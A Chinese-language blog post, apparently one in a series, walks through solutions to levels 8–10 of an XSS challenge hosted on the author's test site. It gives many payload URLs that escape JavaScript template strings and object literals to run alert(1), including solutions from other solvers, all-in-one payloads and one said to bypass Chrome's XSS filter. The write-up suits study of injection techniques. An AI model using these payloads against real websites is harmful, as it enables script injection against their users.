这时候应该已经可以弹窗了，测试后发现这里后面会多了个模版字符串，导致了模板字符串的提前闭合，所以需要给前面加一位字符串用来“占位”。
    view-source:http://px1624.sinaapp.com/test/xsstest9/?px=1\%27-{a:`}-alert(1)//`}-{a:`${`%3C!--%3Cscript%20%3E
可以看到，语法一切OK，这时候去试试会不会正常弹窗。
    http://px1624.sinaapp.com/test/xsstest9/?px=1\%27-{a:`}-alert(1)//`}-{a:`${`%3C!--%3Cscript%20%3E
◇ 2 再来看看第十题
看着好像和第九题差不多，也是4处输出，js中的过滤规则是一样的，不同的是html中第一处的输出将字符限制的只有2个了，第二处没有限制长度。这样的话，即使知道了上面的构造思路，但是在构造上整体还是比第九题要难一些，因为毕竟2个字符长度能做的事情还是比较有限的。  
我们直接把第九题的payload套在第十题去调试，因为前面的js部分是一样的，这样可以直接避免掉前面两处js输出部分的语法问题。
    view-source:http://px1624.sinaapp.com/test/xsstest10/?px=1\%27-{a:`}-alert(1)//`}-{a:`${`%3C!--%3Cscript%20%3E
如上图，发现由于第三处输出点没能写入任何有用的东西，导致后面的闭合点发生了变化，前面第九题也分析过，这种情况这个运算符的位置，是没办法写入alert的，因为会导致前面js部分的语法出错。  
所以我们的构造思路，还是要想办法把第三处输出点利用起来，但是这里只有2个字符的长度，通过第九题的分析过程，那么这个点我们只能写入``}`才比较合适。  
所以payload进行下改动就是，只能先把这个 ``}`放到最前面。
    view-source:http://px1624.sinaapp.com/test/xsstest10/?px=`}\%27-{a:`}`}-{a:`${`%3C!--%3Cscript%20%3E
这时候会发现后面多了个``}`
出来，是不是感觉似曾相识哈？第九题也出现过类似的问题，后面多了个大括号我们嵌套了一层对象，这里是多出来了一个``}`那么闭合的话就必须用
`{``字符。这样的话，对象就不行了，因为会导致模板字符串就近闭合。前面提到过避免这种问题的方法，那就是用js中的嵌套模板${}
所以这里我们就用这个思路，再写进去个模板试试，这里直接用了2次模板的嵌套。
    view-source:http://px1624.sinaapp.com/test/xsstest10/?px=`}\%27-{a:`}`}-{a:`${`${`%3C!--%3Cscript%20%3E
貌似已经成功了，只需要在这个点写入alert再注释掉后面内容就可以了，那我们去试试。
    http://px1624.sinaapp.com/test/xsstest10/?px=`}\%27-{a:`}-alert(1)//`}-{a:`${`${`%3C!--%3Cscript%20%3E
◇ 3 再来看看第八题  
我们再把第九题的解套用在第八题上试试。
    view-source:http://px1624.sinaapp.com/test/xsstest8/?px=1\%27-{a:`}-alert(1)//`}-{a:`${`%3C!--%3Cscript%20%3E
可以看到，由于前面多了个字符，导致第三处后面的大括号被干掉了，所以把前面的那个字符去掉。
    view-source:http://px1624.sinaapp.com/test/xsstest8/?px=\%27-{a:`}-alert(1)//`}-{a:`${`%3C!--%3Cscript%20%3E
貌似已经OK了？观察下发现不对，后面没script闭合标签啊。那么就给加个 进去不就行了。
    http://px1624.sinaapp.com/test/xsstest8/?px=\%27-{a:`}-alert(1)//%3C/script%3E`}-{a:`${`%3C!--%3Cscript%20%3E
这个解也是不受谷歌XSS filter拦截的额。  
上一篇中提到过，第八题ID：gainover、Huuuuu 还都给出了另一个解法。其中ID：gainover给的原payload如下：
    http://px1624.sinaapp.com/test/xsstest8/?px=\%27-{a:`}*/alert(1)/-alert(1)///*%3C/script%3E%3C!--%3Cscript%20%3E`}-{c:`${`
优化下就是
    http://px1624.sinaapp.com/test/xsstest8/?px=\%27-{a:`}-alert(1)//%3C/script%3E%3C!--%3Cscript%20%3E`}-{c:`${`
对比下就会发现，构造思路应该和上面解析的过程，是差不多的。  
ID：Huuuuu 给的解法，后面的内容也会提到。  
◇ 4 思考一下  
可以看到，只要思路对了，很多题的解法也是比较相通的，所用到的都是基础的js知识，但是知道这些知识能不能构造出来，那就是思路的问题了。  
下面再给出其他人的一些解法思路。  
ID：香草
    http://px1624.sinaapp.com/test/xsstest10/?px=`}-alert(1)//`}-{a:`${`\%27-{a:`}${`%3C!--%20%3Cscript%20%3Ehttp://px1624.sinaapp.com/test/xsstest9/?px=`}-alert(1)//`}-{a:`${`\%27-{a:`}${`%3C!--%20%3Cscript%20%3E
他给出的解是9和10通用的，稍微变化下，还可以8、9、10通用的payload。
    http://px1624.sinaapp.com/test/xsstest8/?px=`}-alert(1)//%3C/script%3E`}-{a:`${`\%27-{a:`}${`%3C!--%20%3Cscript%20%3E
从payload的结构来看，这个构造思路和我前面分析的那个过程是差不多的，并且最终alert也是放在了最后面的输出点位置，进行构造的。不同点是，他这里的模板并未使用嵌套，而是连续连续用了两次。  
ID：Huuuuu
    http://px1624.sinaapp.com/test/xsstest9/?px=%20%20%20%20%20%20%20%20}`})//123111111`(alert(`1`))(function%20a(){`${prompt`%3C!--\%27in`}${eval`%3Cscript%20%3E
这是他的原始payload，优化下就是这样。
    http://px1624.sinaapp.com/test/xsstest9/?px=1111111111111111`}//`-alert(1)-{a:`${`\%27-`}${`%3C!--%3Cscript%20%3E
Huuuuu的这个payload看着和前面 香草 的那个比较像，其实构造思路上还是有蛮大区别的。他是想办法把前面构造的只剩下2个需要闭合的``}`
然后后面的2个输出点就只负责这部分的闭合就行了。在使用模板的时候，和香草一样，也并未使用嵌套，而是连续用了两次，最终的alert是在js的输出点输出的。这样即便后面的2个输出点的限制只有4个字符，他这个构造方法也是比较容易绕过的。所以相对来说，Huuuuu的这个构造思路的通用型，貌似更好一些。  
然后按照他的这个构造思路，第十题的解就是
    http://px1624.sinaapp.com/test/xsstest10/?px=`}//`-alert(1)-{a:`${`\%27-`}${`%3C!--%3Cscript%20%3E
再改改，就可以得到一个通杀8、9、10的payload
    http://px1624.sinaapp.com/test/xsstest8/?px=`}//%3C/script%3E1111111`-alert(1)-{a:`${`\%27-`}${`%3C!--%3Cscript%20%3E
好了，这次的思路分享到这里就结束了，是不是看的很过瘾呢，欢迎留言评论。下篇（最终篇），会专门讲讲公认最难的第六题，以及对前面的所有做一个总结。
尾 巴
目前最新情况是，一部分的人做出来了1~5题，卡到了第6题。其实卡住了的话，是可以跳着去做其他题的，因为整体来看，第6题应该是最难的了。  
ID：gainover 解出了全部10题。ID：Huuuuu 解出了1~5题，以及7~10题。ID：香草
解出了1~4题，以及7~10题。ID：p1g3、zeddy解出了1~5题，以及7~8题。  
其他人若有别的解法思路，可以将自己的答案和ID发我qq邮箱：px1624.qq.com
这篇文章的编辑，兼职要了半条老命。发下个人的纯技术交流的 微信公众号：不忘初心px1624